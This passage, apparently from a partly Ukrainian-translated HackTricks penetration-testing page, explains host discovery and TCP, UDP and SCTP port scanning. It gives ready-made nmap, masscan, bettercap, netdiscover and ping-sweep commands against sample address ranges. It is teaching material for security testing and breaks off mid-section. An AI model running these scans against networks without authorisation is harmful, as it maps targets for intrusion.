# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ—É–º **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Discovering hosts from the outside

This is going to be a **–∫–æ—Ä–æ—Ç–∫–∏–π —Ä–æ–∑–¥—ñ–ª** –ø—Ä–æ —Ç–µ, —è–∫ –∑–Ω–∞–π—Ç–∏ **IP-–∞–¥—Ä–µ—Å–∏, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å** –∑ **–Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É**.\
–£ —Ü—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó —É –≤–∞—Å —î –¥–µ—è–∫–∏–π **–æ–±—Å—è–≥ IP-–∞–¥—Ä–µ—Å** (–º–æ–∂–ª–∏–≤–æ, –Ω–∞–≤—ñ—Ç—å –∫—ñ–ª—å–∫–∞ **–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤**) —ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—Ä–æ—Å—Ç–æ –∑–Ω–∞–π—Ç–∏ **—è–∫—ñ IP-–∞–¥—Ä–µ—Å–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å**.

### ICMP

This is the **–Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π** —ñ **–Ω–∞–π—à–≤–∏–¥—à–∏–π** —Å–ø–æ—Å—ñ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –∞–∫—Ç–∏–≤–Ω–∏–π —Ö–æ—Å—Ç.\
–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ **ICMP** –ø–∞–∫–µ—Ç—ñ–≤ —ñ **–æ—á—ñ–∫—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**. –ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± - –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **echo request** —ñ –æ—á—ñ–∫—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–æ—Å—Ç–∏–π `ping` –∞–±–æ `fping` –¥–ª—è **–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤**.\
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **nmap** –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö —Ç–∏–ø—ñ–≤ ICMP –ø–∞–∫–µ—Ç—ñ–≤ (—Ü–µ —É–Ω–∏–∫–Ω–µ —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ –¥–ª—è –∑–≤–∏—á–∞–π–Ω–∏—Ö ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

–î—É–∂–µ —á–∞—Å—Ç–æ –º–æ–∂–Ω–∞ –≤–∏—è–≤–∏—Ç–∏, —â–æ –≤—Å—ñ –≤–∏–¥–∏ ICMP –ø–∞–∫–µ—Ç—ñ–≤ —Ñ—ñ–ª—å—Ç—Ä—É—é—Ç—å—Å—è. –¢–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –∞–∫—Ç–∏–≤–Ω–∏–π —Ö–æ—Å—Ç, —Ü–µ **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–∞–π—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏**. –ö–æ–∂–µ–Ω —Ö–æ—Å—Ç –º–∞—î **65535 –ø–æ—Ä—Ç—ñ–≤**, —Ç–æ–º—É, —è–∫—â–æ —É –≤–∞—Å "–≤–µ–ª–∏–∫–∏–π" –æ–±—Å—è–≥, –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ** –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ **–∫–æ–∂–µ–Ω –ø–æ—Ä—Ç** –∫–æ–∂–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —á–∏ –Ω—ñ, —Ü–µ –∑–∞–π–º–µ –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç–æ —á–∞—Å—É.\
–¢–æ–¥—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω **—à–≤–∏–¥–∫–∏–π —Å–∫–∞–Ω–µ—Ä –ø–æ—Ä—Ç—ñ–≤** ([masscan](https://github.com/robertdavidgraham/masscan)) —ñ —Å–ø–∏—Å–æ–∫ **–Ω–∞–π–±—ñ–ª—å—à –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–∏—Ö –ø–æ—Ä—Ç—ñ–≤:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü–µ–π –∫—Ä–æ–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `nmap`, –∞–ª–µ —Ü–µ –ø–æ–≤—ñ–ª—å–Ω—ñ—à–µ, —ñ –¥–µ—â–æ `nmap` –º–∞—î –ø—Ä–æ–±–ª–µ–º–∏ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—î—é –∞–∫—Ç–∏–≤–Ω–∏—Ö —Ö–æ—Å—Ç—ñ–≤.

### –í–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ä—Ç—É HTTP

–¶–µ –ø—Ä–æ—Å—Ç–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è TCP-–ø–æ—Ä—Ç—É, –∫–æ—Ä–∏—Å–Ω–µ, –∫–æ–ª–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ **–∑–æ—Å–µ—Ä–µ–¥–∏—Ç–∏—Å—è –Ω–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—ñ HTTP** **—Å–µ—Ä–≤—ñ—Å—ñ–≤**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —î –¥–µ—è–∫—ñ **UDP –ø–æ—Ä—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º–∏**, —â–æ–± –≤–∏—Ä—ñ—à–∏—Ç–∏, —á–∏ —Å–ª—ñ–¥ **–∑–≤–µ—Ä–Ω—É—Ç–∏ –±—ñ–ª—å—à–µ —É–≤–∞–≥–∏** –Ω–∞ **—Ö–æ—Å—Ç.** –û—Å–∫—ñ–ª—å–∫–∏ UDP —Å–µ—Ä–≤—ñ—Å–∏ –∑–∞–∑–≤–∏—á–∞–π **–Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å** –∑ **–∂–æ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏** –Ω–∞ –∑–≤–∏—á–∞–π–Ω–∏–π –ø–æ—Ä–æ–∂–Ω—ñ–π UDP –∑–∞–ø–∏—Ç, –≤–∞–∂–∫–æ —Å–∫–∞–∑–∞—Ç–∏, —á–∏ –ø–æ—Ä—Ç —Ñ—ñ–ª—å—Ç—Ä—É—î—Ç—å—Å—è –∞–±–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π. –ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—Ä—ñ—à–∏—Ç–∏ —Ü–µ - –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–∞–∫–µ—Ç, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –ø—Ä–∞—Ü—é—é—á–∏–º —Å–µ—Ä–≤—ñ—Å–æ–º, —ñ –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫–∏–π —Å–µ—Ä–≤—ñ—Å –ø—Ä–∞—Ü—é—î, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –Ω–∞–π–±—ñ–ª—å—à –π–º–æ–≤—ñ—Ä–Ω–∏–π –Ω–∞ –æ—Å–Ω–æ–≤—ñ –Ω–æ–º–µ—Ä–∞ –ø–æ—Ä—Ç—É:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
–õ—ñ–Ω—ñ—è nmap, –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∞ —Ä–∞–Ω—ñ—à–µ, –ø—Ä–æ—Ç–µ—Å—Ç—É—î **–Ω–∞–π–ø–æ–ø—É–ª—è—Ä–Ω—ñ—à—ñ 1000 UDP –ø–æ—Ä—Ç—ñ–≤** –Ω–∞ –∫–æ–∂–Ω–æ–º—É —Ö–æ—Å—Ç—ñ –≤ –º–µ–∂–∞—Ö **/24** –¥—ñ–∞–ø–∞–∑–æ–Ω—É, –∞–ª–µ –Ω–∞–≤—ñ—Ç—å —Ü–µ –∑–∞–π–º–µ **>20—Ö–≤**. –Ø–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω—ñ **–Ω–∞–π—à–≤–∏–¥—à—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` –¶–µ –Ω–∞–¥—ñ—à–ª–µ —Ü—ñ **UDP –ø—Ä–æ–±–∏** –Ω–∞ —ó—Ö **–æ—á—ñ–∫—É–≤–∞–Ω–∏–π –ø–æ—Ä—Ç** (–¥–ª—è –¥—ñ–∞–ø–∞–∑–æ–Ω—É /24 —Ü–µ –∑–∞–π–º–µ –ª–∏—à–µ 1 —Ö–≤): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≥–∞—Ä–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –∑ —É—Å—ñ—Ö –≤—ñ–¥–æ–º–∏—Ö –∞—Ç–∞–∫ –Ω–∞ Wifi –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## –í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏

–Ø–∫—â–æ –≤–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–µ—Ä–µ–∂—ñ, –æ–¥–Ω—ñ—î—é –∑ –ø–µ—Ä—à–∏—Ö —Ä–µ—á–µ–π, —è–∫—ñ –≤–∏ –∑–∞—Ö–æ—á–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, —î **–≤–∏—è–≤–ª–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö —Ö–æ—Å—Ç—ñ–≤**. –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ **—Ç–æ–≥–æ, —Å–∫—ñ–ª—å–∫–∏ —à—É–º—É** –≤–∏ –º–æ–∂–µ—Ç–µ/—Ö–æ—á–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ —Ä—ñ–∑–Ω—ñ –¥—ñ—ó:

### –ü–∞—Å–∏–≤–Ω–∏–π

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø–∞—Å–∏–≤–Ω–æ–≥–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ—ó –º–µ—Ä–µ–∂—ñ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–µ—Ö–Ω—ñ–∫–∏, –∑–≥–∞–¥–∞–Ω—ñ –≤ [_**–í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑–∑–æ–≤–Ω—ñ**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_), —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —Ç—É—Ç**.\
–ê–ª–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –≤ **—Ç—ñ–π –∂–µ –º–µ—Ä–µ–∂—ñ**, —â–æ –π —ñ–Ω—à—ñ —Ö–æ—Å—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–±–∏—Ç–∏ **–±—ñ–ª—å—à–µ —Ä–µ—á–µ–π**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–µ—Ö–Ω—ñ–∫–∏, –∑–≥–∞–¥–∞–Ω—ñ –≤ _–í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑–∑–æ–≤–Ω—ñ_ ([_**ICMP**_](./#icmp)), —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —Ç—É—Ç**.\
–ê–ª–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –≤ **—Ç—ñ–π –∂–µ –º–µ—Ä–µ–∂—ñ**, —â–æ –π —ñ–Ω—à—ñ —Ö–æ—Å—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–±–∏—Ç–∏ **–±—ñ–ª—å—à–µ —Ä–µ—á–µ–π**:

* –Ø–∫—â–æ –≤–∏ **ping** –∞–¥—Ä–µ—Å–∏ **—à–∏—Ä–æ–∫–æ—ó —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó –ø—ñ–¥–º–µ—Ä–µ–∂—ñ**, ping –ø–æ–≤–∏–Ω–µ–Ω –¥—ñ–π—Ç–∏ –¥–æ **–∫–æ–∂–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞** —ñ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å **–≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏** **–≤–∞–º**: `ping -b 10.10.5.255`
* –ü—ñ–Ω–≥—É—é—á–∏ **–∞–¥—Ä–µ—Å—É —à–∏—Ä–æ–∫–æ—ó —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó –º–µ—Ä–µ–∂—ñ**, –≤–∏ –Ω–∞–≤—ñ—Ç—å –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ö–æ—Å—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **—ñ–Ω—à–∏—Ö –ø—ñ–¥–º–µ—Ä–µ–∂**: `ping -b 255.255.255.255`
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø—Ä–∞–ø–æ—Ä–∏ `-PE`, `-PP`, `-PM` —É `nmap` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ **ICMPv4 echo**, **timestamp** —Ç–∞ **–∑–∞–ø–∏—Ç–∏ –º–∞—Å–∫–∏ –ø—ñ–¥–º–µ—Ä–µ–∂—ñ:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–≤–∫–ª—é—á–µ–Ω–Ω—è** –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤ —á–µ—Ä–µ–∑ **–º–µ—Ä–µ–∂–µ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è**. –ú–∞–≥—ñ—á–Ω–∏–π –ø–∞–∫–µ—Ç, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞, —î –ª–∏—à–µ –ø–∞–∫–µ—Ç–æ–º, –¥–µ –≤–∫–∞–∑–∞–Ω–æ **MAC Dst**, –∞ –ø–æ—Ç—ñ–º –≤—ñ–Ω **–ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è 16 —Ä–∞–∑—ñ–≤** –≤ –æ–¥–Ω–æ–º—É –ø–∞–∫–µ—Ç—ñ.\
–ü–æ—Ç—ñ–º —Ç–∞–∫—ñ –ø–∞–∫–µ—Ç–∏ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –≤ **ethernet 0x0842** –∞–±–æ –≤ **UDP-–ø–∞–∫–µ—Ç—ñ –Ω–∞ –ø–æ—Ä—Ç 9**.\
–Ø–∫—â–æ **–Ω–µ –≤–∫–∞–∑–∞–Ω–æ \[MAC]**, –ø–∞–∫–µ—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ **—à–∏—Ä–æ–∫–∏–π –µ—Ñ—ñ—Ä** (—ñ —à–∏—Ä–æ–∫–æ–º–æ–≤–Ω–∏–π MAC –±—É–¥–µ —Ç–∏–º, —â–æ –ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤

–Ø–∫—â–æ –≤–∏ –≤–∏—è–≤–∏–ª–∏ –≤—Å—ñ IP-–∞–¥—Ä–µ—Å–∏ (–∑–æ–≤–Ω—ñ—à–Ω—ñ –∞–±–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ), —è–∫—ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥–µ—Ç–∞–ª—å–Ω–æ –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –¥—ñ—ó.

### TCP

* **–í—ñ–¥–∫—Ä–∏—Ç–∏–π** –ø–æ—Ä—Ç: _SYN --> SYN/ACK --> RST_
* **–ó–∞–∫—Ä–∏—Ç–∏–π** –ø–æ—Ä—Ç: _SYN --> RST/ACK_
* **–§—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏–π** –ø–æ—Ä—Ç: _SYN --> \[–ù–Ü –í–Ü–î–ü–û–í–Ü–î–Ü]_
* **–§—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏–π** –ø–æ—Ä—Ç: _SYN --> ICMP –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

–Ñ 2 –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è UDP –ø–æ—Ä—Ç—É:

* –í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ **UDP –ø–∞–∫–µ—Ç** —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å _**ICMP –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π**_, —è–∫—â–æ –ø–æ—Ä—Ç **–∑–∞–∫—Ä–∏—Ç–∏–π** (–≤ –∫—ñ–ª—å–∫–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö ICMP –±—É–¥–µ **—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏–π**, —Ç–æ–º—É –≤–∏ –Ω–µ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∂–æ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —è–∫—â–æ –ø–æ—Ä—Ç –∑–∞–∫—Ä–∏—Ç–∏–π –∞–±–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π).
* –í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ **—Ñ–æ—Ä–º–∞—Ç–æ–≤–∞–Ω—ñ –¥–∞—Ç–∞–≥—Ä–∞–º–∏** –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ **—Å–µ—Ä–≤—ñ—Å—É** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, DNS, DHCP, TFTP —Ç–∞ —ñ–Ω—à–∏—Ö, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ _nmap-payloads_). –Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ **–≤—ñ–¥–ø–æ–≤—ñ–¥—å**, —Ç–æ–¥—ñ –ø–æ—Ä—Ç **–≤—ñ–¥–∫—Ä–∏—Ç–∏–π**.

**Nmap** –±—É–¥–µ **–ø–æ—î–¥–Ω—É–≤–∞—Ç–∏ –æ–±–∏–¥–≤–∞** –≤–∞—Ä—ñ–∞–Ω—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ "-sV" (—Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è UDP –¥—É–∂–µ –ø–æ–≤—ñ–ª—å–Ω–µ), –∞–ª–µ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è UDP –ø–æ–≤—ñ–ª—å–Ω—ñ—à–µ, –Ω—ñ–∂ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–∞–∑–æ–º –∑ **TCP (Transmission Control Protocol)** —Ç–∞ **UDP (User Datagram Protocol)**. –ô–æ–≥–æ –æ—Å–Ω–æ–≤–Ω–∞ –º–µ—Ç–∞ - –ø–æ–ª–µ–≥—à–∏—Ç–∏ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É–≤–∞–Ω–Ω—è —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏—Ö –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ IP-–º–µ—Ä–µ–∂—ñ, –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –±–∞–≥–∞—Ç–æ –∑ —Ñ—É–Ω–∫—Ü—ñ–π –Ω–∞–¥—ñ–π–Ω–æ—Å—Ç—ñ, —è–∫—ñ —î –≤ **Signaling System 7 (SS7)**. **SCTP** —î –æ—Å–Ω–æ–≤–Ω–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º —Å—ñ–º–µ–π—Å—Ç–≤–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ **SIGTRAN**, —è–∫–µ –º–∞—î –Ω–∞ –º–µ—Ç—ñ 